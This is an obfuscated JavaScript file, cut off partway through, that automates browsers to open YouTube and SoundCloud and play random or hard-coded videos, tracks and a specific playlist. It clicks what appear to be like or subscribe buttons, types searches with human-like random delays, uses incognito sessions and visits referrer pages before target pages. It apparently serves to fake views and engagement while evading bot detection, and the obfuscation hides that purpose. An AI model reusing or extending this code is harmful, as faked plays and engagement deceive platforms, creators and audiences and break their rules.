const Y = b,
  X = c,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x3e1 + 0x669 + -0x287 * 0x1))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x56 * 0x20 + -0x1c * -0x68 + -0x1620);
    let h = e[f];
    if (c['uUqvlm'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x893 + 0x2 * -0xa39 + 0xbdf, r, s, t = 0x2f * 0xb8 + -0x1 * -0x1f31 + -0x40f9 * 0x1; s = m['charAt'](t++); ~s && (r = q % (-0x1391 + 0xb64 + 0x831) ? r * (0x1384 + -0x5d * -0x5b + 0x8d * -0x5f) + s : s, q++ % (-0x1675 * 0x1 + 0x10 * -0xe3 + 0x755 * 0x5)) ? o += String['fromCharCode'](0xf * -0x127 + -0x279 * 0x5 + -0x20b * -0xf & r >> (-(0xa4 * -0x20 + -0x49 * -0x1 + -0x1439 * -0x1) * q & -0x25 * -0x15 + 0x1752 + 0x1 * -0x1a55)) : 0x1 * -0xc4b + -0x45e * 0x5 + -0x2221 * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * 0xfc3 + -0x1083 * -0x1 + -0x30 * 0x4, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x15ca + -0x3 * 0xb71 + 0xc99))['slice'](-(0xa7 * -0xe + 0x2 * -0x5a4 + 0x146c));
        }
        return decodeURIComponent(p);
      };
      c['DFaVLz'] = i, b = arguments, c['uUqvlm'] = !![];
    }
    const j = e[0x1dee + 0x7 * -0x3a9 + -0x44f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['DFaVLz'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x646 * -0x3 + -0x236e + -0xd9 * -0x40), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x495e + 0x8281 + -0x56af * 0x1 + (0x2dd * 0x1f + 0x369d + -0x54c8) * random()) : await standardWaitForNetIdle(f), await wait(-0x641 * -0x3 + -0x41b * -0x3 + -0xb8c + (0x1d * 0x5 + 0x1b2a + -0xb55 * -0x1) * random()), -0x25 * -0x15 + 0x1752 + 0x1 * -0x1a5a;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1 * -0xc4b + -0x45e * 0x5 + -0x35a9 * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * 0xfc3 + -0x1083 * -0x1 + -0xbf * 0x1;
}
async function randomWait() {
  return await wait(0x15ca + -0x3 * 0xb71 + 0x2011 + (0xa7 * -0xe + 0x2 * -0x5a4 + 0x27f2) * random()), 0x1dee + 0x7 * -0x3a9 + -0x44e;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xa82 + -0x1900 + 0x2382, -0x5 * -0x2ce + -0x1e81 + -0x2 * -0x841), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x2b01 + -0x244b + 0x139ac) * getRandomInt(0x23d3 + 0x1817 + -0x3be8, 0x1137 + -0x13cc + -0x14d * -0x2), h)), -0x1e16 + 0x1508 + 0x90f * 0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x13d5 + 0x87d + 0x19 * -0x122;
    i = i[R(0x11)](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x6f2 + -0xdd1 + 0x6e * 0x10]['split']('\x20');
    for (let k = -0x338 + -0xd1f * 0x1 + 0x1057; k < i['length']; k += -0x3dc * 0x9 + 0xa8 + 0x2 * 0x110b)
      j += i[k] * h[i[k + (-0x15d * 0x1 + 0x175 * 0x15 + -0x1d3b)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x2463 + 0x1479 + -0x38d6)['map'](l => Array['from'](l['children']))['flat'](-0x797 + -0x1 * -0xb93 + 0x3fb * -0x1)['map'](l => l['childNodes'][-0x418 + -0x1d6c + -0x2185 * -0x1]['childNodes'][0x25ba + 0xd34 + 0x2 * -0x1977]['childNodes'][0x2f + -0x1243 + 0x1215]['childNodes'][-0x823 + -0x25ae + -0x13d * -0x25]['childNodes'][0xd * -0x21e + 0x1 * 0x264b + -0xac4]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x29c + -0x1 * 0x1832 + -0x2 * -0xf5b, -0x23d2 + -0x1 * 0x19a9 + 0x5103)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x212 * -0x33 + -0x55f5 + 0x5 * 0x7cb);
  const h = await getMaxTime(f),
    i = Math['min']((-0x4a8e * -0x1 + -0x2 * 0x3bb + 0x194 * 0x6a) * getRandomInt(0x251c + 0x12ec + -0x3806, 0x7de + -0xd * -0xe + -0x88f), h);
  return await wait(i), -0x1 * 0x2702 + 0xea1 + -0x1 * -0x1862;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x2154 + 0x10e9 + -0x3 * 0x10bf]['children'][-0x1c3 * -0x1 + 0x158c + -0x27 * 0x99]['children'][0xe9 * 0x1f + 0x1 * -0xa92 + -0x11a5]['children'][-0xd13 * -0x1 + 0x73f + -0x1452]['children'][-0x1e70 + 0x1543 * 0x1 + 0x92d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x225c + 0x1d92 + -0x5 * 0xcc9;
}
async function searchAndView(f) {
  const ag = {
    f: 0x4
  };
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + S(ag.f)]('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x994 + 0x690 + 0x10 * -0xfc + (-0x1 * -0x83b + -0x2 * 0x111b + 0x1 * 0x1a2d) * random()
  }), await wait(0x3c * -0x19 + 0x21a7 + -0x2df * 0x9 + (0x254f * 0x1 + -0x1b3 + -0x4c * 0x74) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xc6e + -0x13d * -0x13 + -0x23f3]['childNodes'][-0x1cd7 + 0x97 + 0x1c41]['childNodes'][-0xda1 + 0x1 * 0x231a + 0x2 * -0xabc]))[Math['floor'](Math[T(0x19)]() * m['length'])];
    var m;
    const n = l['childNodes'][-0xe97 + 0x827 + 0x3 * 0x227]['childNodes'][0xc0d + -0xeb8 + 0x2ab * 0x1]['childNodes'][0x1 * 0x73b + 0xf79 + 0x46 * -0x53]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x4e3 + 0x1fb0 + 0x2 * -0xd66),
          r = 0x1 * 0xde6 + 0x1f * -0x39 + -0x6ff;
        for (let u = 0x90f + 0x1281 + -0x1b90; u < q['length']; u += -0xc6b * 0x1 + 0x15b1 + -0x251 * 0x4)
          r += q[u] * k[q[u + (-0x1af0 + 0x2599 + -0xaa8)]];
        return r;
      }(n);
  });
  await wait((-0x281 + 0x2247 + 0x1ad2) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x17789 + -0x5e * -0xa0 + 0xb * 0x321b) * getRandomInt(0x32 * -0xc0 + 0x2443 + 0x13e, -0xa4 * 0xc + 0x11 * 0x1 + -0x35 * -0x25), h + (-0x3 * -0x859 + -0x592 * 0x7 + 0x217b));
  return await wait(i), -0x2 * 0x98 + -0x1afe + -0x1c2f * -0x1;
}
async function keyWatch(f) {
  const U = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints[U(0x1, '@9h7')]() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x4e6 + -0x1d6d + 0x27 * 0xa1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x23 * -0xe5 + -0x605 * -0x2 + 0x1efd + (-0x839 * 0x4 + 0x1374 + -0x6f * -0x28) * Math['random']());
    });
  }, -0x216b + -0x883 * -0x1 + 0x10 * 0x344);
  await wait(0x181c * -0x4a + -0x475c2 + 0x1 * 0x1001ba);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x128e5 + -0x1b680 + -0x895 * -0x71) * getRandomInt(-0x697 + -0x1f7d + -0x986 * -0x4, -0x737 * 0x3 + 0x1 * 0x3e1 + 0x11dd)), clearInterval(h), -0x12c6 + -0x14e3 * 0x1 + 0x27aa;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x56 * 0x20 + -0x1c * -0x68 + -0x1620);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xb61 * -0x1 + -0xe5 * 0xf + 0x18cc;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1ed4 + -0xd * -0xa + -0x1f55 * 0x1;
    await randomWait();
  }
  return -0x251 * 0x6 + -0x1acf * -0x1 + 0x2 * -0x674;
}

function fetchRandomSC() {
  return Math['random']() <= 0x20c + 0x2 * 0x819 + -0x2 * 0x91f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xee * 0x7 + 0x44d + -0xacf + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x2e1 + 0x1130 + -0x1411 * 0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x10be + 0x9 * 0x233 + -0x2489;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x7c9c + -0x999a + 0x2 * 0x6663 + getRandomInt(-0x194f + -0x1 * 0x628d + 0x5b3a * 0x2, -0x7d1d + 0x95f5 * -0x1 + 0x18842));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1ec1 * -0x1 + -0xaa7 + -0x157 * 0xf), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x120f * 0x1 + -0xa8a + 0x1c99;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1fb4 + -0x4 * -0x506 + -0x33cc, -0x134b + 0xf2a * -0x2 + 0x31d1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * -0xc46 + -0x162c + 0x2a42 * 0x1 + floor((-0xc * -0x213 + 0x7e5 + 0x1ce1 * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3d773a * 0x257 + -0x33c7ca3c + -0x11fa51f1 * -0x12),
          0x29a48c + 0xd39658 + -0x7d3ae4,
          -0x3189 + 0x7ed3 * 0x1 + -0x1 * -0x32b6,
          -0x57b * 0x1 + 0x1 * 0x264b + -0x2050
        ], y = [
          0x1574 + 0x1bd * -0xd + 0x13d,
          -0x2610 + -0x1dd8 + -0xa * -0x6cc,
          0x2 * 0x436 + -0x1f * -0x67 + -0x6d * 0x31,
          0xfbd + -0xb4 * 0x35 + 0x1587 * 0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1dc1 + -0x11f6 + 0x1 * -0xbca)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1253 + 0xb0d + 0x5e0 * -0x5; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x17d3 + 0x1a69 + -0x2 * 0x191e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xa7e + 0x9d6 + -0xa8 * -0x1] = A[0x446 * -0x7 + 0x4 * 0x13a + 0x1912] = A[0x2 * -0x71f + -0xde5 + 0x1 * 0x1c24] = A[-0x12cc + 0x206e + -0xda0] = A[0x408 + 0x31 * -0x59 + -0x31 * -0x44] = A[0x1a5a + 0x126d + -0x2cc3] = A[-0xa61 + -0x24dd + 0x2f43] = A[0x48c + -0x25d0 + 0x1 * 0x214a] = A[-0x24cb * -0x1 + -0x44a + -0x207a] = A[0x147a + -0x5 * -0x747 + -0x38d5] = A[-0xc9 * -0x3 + -0x22d * 0xd + -0x11 * -0x187] = A[-0x1110 + -0x1ca3 + 0x1 * 0x2dbd] = A[-0x1 * 0x1eb3 + 0x131 * 0x17 + 0xf * 0x39] = A[-0x5 * -0x5bf + 0x1 * 0x1475 + 0xb9 * -0x44] = A[-0x12 * 0x10 + 0x1708 + -0x15db] = A[-0x6e * 0x11 + 0x5c1 * -0x1 + 0xd1d] = A[0x1ff5 * 0x1 + -0xf24 + -0x1a * 0xa5] = -0x2513 + 0x25a + 0xb93 * 0x3, this['blocks'] = A) : this['blocks'] = [
                -0x194b + 0x25fe + 0xcb3 * -0x1,
                0x1e * -0xf9 + 0x8a7 + -0x5 * -0x41b,
                -0x158c + -0x595 * 0x1 + 0x1b21 * 0x1,
                0x14f2 + 0x6b1 * -0x1 + -0xe41,
                0x5b1 * -0x5 + -0x21bc + 0x3e31,
                -0x5c7 + 0x83 * -0x1 + 0x64a,
                -0x220d + -0x828 + 0x2a35,
                0xe5f + 0x6dd * -0x1 + -0x782 * 0x1,
                -0x1a95 + -0x1 * -0xbe1 + -0x3ad * -0x4,
                -0x1613 * 0x1 + 0x1d5f + -0x3a6 * 0x2,
                0x39d + -0x238 + -0x165,
                -0x1005 + -0x1a8e + -0x2a93 * -0x1,
                0x1 * -0x99b + 0x13 * -0x14d + 0x2252,
                0x1838 * -0x1 + -0xe0b * -0x1 + 0x5 * 0x209,
                0x1 * -0x1931 + 0x78c + 0x11a5,
                0xa6 + -0x15 * -0x81 + -0x1 * 0xb3b,
                0x269b * 0x1 + 0x1231 * 0x2 + -0x4afd
              ], this['h0'] = -0xb48c4816 + -0x13ef8a9b * -0x9 + 0x68658ba4, this['h1'] = 0x11 * -0xe92cb43 + -0x1b704 * 0x9739 + 0x2eae246e0, this['h2'] = -0xc7d169 * 0x109 + 0x136 * -0xec5f91 + 0x285ce5c45, this['h3'] = 0xb8a * 0x1f6db + -0x1 * 0x40159a9 + 0x1 * -0x276ccef, this['h4'] = 0x15 * 0x108bfb2d + -0x21 * 0x121bc67 + -0x724f6f7a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1417 + -0x12b2 * 0x1 + -0x1 * 0x165, this['finalized'] = this['hashed'] = -0x525 * -0x1 + 0x2130 + -0x2655, this['first'] = -0x13a9 * -0x1 + -0xa7 * -0x1c + -0x25ec;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * -0xadb + 0x12df + -0x1dba, O = J['length'] || -0x2c8 * -0x8 + -0xea4 * -0x1 + -0x24e4, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xe8 + -0x1565 + 0x164d, P[0x1ac2 + -0x24c2 + 0xa00] = this['block'], P[0x1 * -0x15db + 0x3f3 * -0x1 + 0x19de] = P[0x1319 * 0x1 + -0x631 + 0x1 * -0xce7] = P[-0x1bdb + 0x11af + 0xa2e] = P[0x1 * -0xb85 + 0xf17 + -0x38f] = P[0x10aa + 0x118d + -0x2233 * 0x1] = P[0x3 * 0x1bf + -0x123b + 0xd03] = P[-0x1bdd + 0x1b9 * -0x10 + 0x3773] = P[-0x18a6 + -0x1f82 + 0x382f] = P[0x13c * 0x5 + 0x14 * -0x2c + -0x2b4] = P[0x1 * -0x1aed + 0x1 * 0xbcc + 0xf2a] = P[-0x3bd + 0x1bc4 * -0x1 + 0x5f * 0x55] = P[0x687 * 0x1 + -0x4d5 + -0x1a7] = P[-0x12ff + 0xabd * -0x1 + -0x1 * -0x1dc8] = P[-0x1d8c + 0x78e + 0x160b] = P[-0x14fe * 0x1 + -0x2 * -0xae2 + -0xb8] = P[0x1 * 0x86f + -0x1ae0 + 0x940 * 0x2] = 0x12 * -0xc5 + 0x8d6 + 0xd6 * 0x6), K) {
                    for (N = this['start']; M < O && N < -0xbfa + -0x11b3 + 0x1ded; ++M)
                      P[N >> -0x3 * 0x62a + 0x8f0 + 0x990] |= J[M] << y[0x12df + 0x8b5 + 0x1 * -0x1b91 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2226 + 0xc * 0x31c + 0x2ea * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < -0x28 * 0x3e + 0x5a9 + 0x3d * 0x13 ? P[N >> 0x1293 + 0xcb2 + -0x1f43] |= L << y[-0xeea + -0x112 + -0x13b * -0xd & N++] : L < -0x8c8 + 0x82b + 0x1 * 0x89d ? (P[N >> -0x2468 + -0xa95 + -0x1 * -0x2eff] |= (-0x5c * 0x29 + 0x1777 + -0x7fb | L >> 0x526 * -0x1 + -0x17d + -0x5 * -0x155) << y[-0x67 * 0x5b + 0x596 + 0x1f0a & N++], P[N >> -0x4 * -0x3c8 + -0x10c3 + 0x1a5] |= (0x1 * -0x228b + 0x24ce * 0x1 + 0xb * -0x29 | 0x1e5f + 0x341 + -0x6ad * 0x5 & L) << y[0x358 * 0x6 + -0x287 + -0x1186 & N++]) : L < 0x191c + 0x2742 + -0x4bd1 * -0x2 || L >= 0xec31 + 0x5 * 0x4bd9 + 0x39 * -0x6de ? (P[N >> -0x1e25 + 0x118b + -0x6 * -0x21a] |= (-0x878 + -0x5ab + 0xf03 | L >> 0x1a57 + -0x3 * -0x63b + -0x2cfc) << y[-0x7d2 + 0x65d * 0x1 + 0x178 & N++], P[N >> -0x18b + -0x20d9 * 0x1 + -0xe * -0x275] |= (-0x14cc + -0x31f + 0x186b | L >> 0x44f + -0x384 * -0x2 + 0x1 * -0xb51 & -0xc * 0x2ef + -0x59 * 0x2f + 0x33ca) << y[0x24af * -0x1 + -0x1700 + 0x1dd9 * 0x2 & N++], P[N >> -0xcb1 + 0xd03 + -0x50] |= (-0x1af2 + 0x1 * -0xfdf + 0x2b51 * 0x1 | 0x3db + 0x254 + -0x5f0 & L) << y[0x1c43 + 0x9e * 0x31 + -0x3a7e * 0x1 & N++]) : (L = 0x87a5 + 0xc82f + -0x4fd4 + ((-0x1 * -0x13ff + 0x4 * -0x400 + 0x0 & L) << 0xf63 + 0x1639 + 0x2a * -0xe5 | -0xfd5 * -0x2 + 0xa61 + -0x260c & J['charCodeAt'](++M)), P[N >> -0x7b1 + 0x888 + -0xd5] |= (0x26bd + 0x3b3 + -0x14c0 * 0x2 | L >> -0x121f * -0x2 + -0x34e + -0x20de) << y[0x22b + 0x24a + -0x472 & N++], P[N >> 0x2d + -0x231a + -0x21 * -0x10f] |= (0x1474 + -0x246e + 0x3 * 0x57e | L >> 0x973 * 0x1 + 0x106f + 0x1 * -0x19d6 & -0xd15 + -0x1e91 + 0x2be5) << y[-0x80 * -0xe + -0x101 * -0x10 + -0x7af * 0x3 & N++], P[N >> -0x1ab2 + -0x4 * -0x10e + 0x167c] |= (-0x2dd + 0x1150 + -0xdf3 * 0x1 | L >> 0x1 * 0x210c + 0x115f * -0x1 + -0xfa7 & 0x3 * -0x3eb + 0x1 * 0x114e + -0x54e) << y[0x1 * -0xc9a + -0x1c2c + 0x28c9 & N++], P[N >> 0x382 + -0x1d91 + -0x1a11 * -0x1] |= (0x119 * 0x9 + 0x5c6 + 0xf27 * -0x1 | 0x6f * 0x37 + -0x16c5 + -0x1 * 0xd5 & L) << y[-0xe + 0x16a4 + 0x1 * -0x1693 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1262 + -0x1481 + 0x2723 ? (this['block'] = P[-0xd79 + 0x3b2 + 0x9d7], this['start'] = N - (-0xd * 0x1b5 + 0x11bc * -0x1 + 0x282d), this['hash'](), this['hashed'] = -0x170 + 0x908 + -0x797) : this['start'] = N;
                }
                return this['bytes'] > -0x1 * -0x12a04584f + 0xa8861ecc + -0xd28a771c && (this['hBytes'] += this['bytes'] / (-0x94 * 0x16c9775 + -0xc0c95f4 + 0x1ded42598) << -0x119d * 0x2 + 0x2238 + -0x2b * -0x6, this['bytes'] = this['bytes'] % (0x76f28dc0 + 0x814d0f84 + 0x7c062bc * 0x1)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2 * 0x86d + 0x4 * 0x609 + -0x28fd * 0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * 0x1f54 + -0x7 * 0x153 + 0x28a9] = this['block'], J[K >> 0x202 + 0x1 * 0x1d8f + 0xa85 * -0x3] |= x[0x1476 + 0x1336 + 0x30d * -0xd & K], this['block'] = J[0xef * -0x21 + 0x65f + -0xe * -0x1c0], K >= -0x11ab * -0x1 + -0x1a95 * 0x1 + -0x7 * -0x14e && (this['hashed'] || this['hash'](), J[-0x1 * -0x967 + -0x2472 + -0x12d * -0x17] = this['block'], J[0x9d * 0x8 + -0x24b1 + -0x1 * -0x1fd9] = J[-0x524 + 0x251 * -0xd + 0x2342] = J[0x6c5 * -0x1 + 0x1266 + -0xb9f] = J[-0x4 * -0x32b + -0x1 * 0x226c + 0x15c3] = J[0xe1b + 0x140c + -0x2223] = J[0x1bf + -0x1 * 0xd81 + 0xbc7] = J[-0x1 * -0x20dd + 0x74c + -0x2823] = J[-0x4b9 + 0x177d + 0x3 * -0x63f] = J[-0x1 * -0x1b31 + -0x1 * -0x166 + -0x1c8f] = J[0x88c + -0xd9 * 0xb + -0x1a * -0x8] = J[-0x1964 + -0x3 * 0x8dd + -0x1157 * -0x3] = J[-0x4 * -0x3d0 + -0x1d * -0x7 + -0x1 * 0x1000] = J[-0x685 * -0x3 + -0x1b41 + 0x7be] = J[-0x1137 * 0x2 + 0x172 + 0xb03 * 0x3] = J[0x1208 + -0x5 * -0x768 + -0x3702] = J[-0x141 + -0x2c * 0xb9 + 0x211c] = 0x1 * 0xb9f + 0x62f * 0x1 + 0x56 * -0x35), J[0x75 * -0x1 + 0xd56 + -0x1 * 0xcd3] = this['hBytes'] << -0xa26 * -0x1 + 0x1 * 0x1bf0 + -0x2613 | this['bytes'] >>> -0x2d6 * 0x5 + 0x4a8 * -0x8 + 0x179 * 0x23, J[-0x222f + 0x1 * 0xc3e + 0x1600] = this['bytes'] << 0x4 * 0x6bc + 0x3 * -0xaed + 0x5da, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
